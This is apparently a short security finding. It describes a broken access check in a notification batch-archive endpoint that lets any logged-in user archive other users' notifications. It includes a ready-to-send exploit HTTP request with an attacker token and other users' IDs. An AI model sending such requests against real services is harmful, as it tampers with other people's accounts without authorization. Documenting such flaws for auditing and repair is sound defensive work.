diagnosis: The batch_archive action executes an update query directly against UserNotification.objects.filter(id__in=notification_ids) without scoping by recipient=self.request.user. Any authenticated user can force-archive notifications belonging to other users.
exploit_request:
POST /api/notifications/batch-archive/ HTTP/1.1
Host: alerts.cloudportal.io
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"ids": [102, 103, 104, 105]}
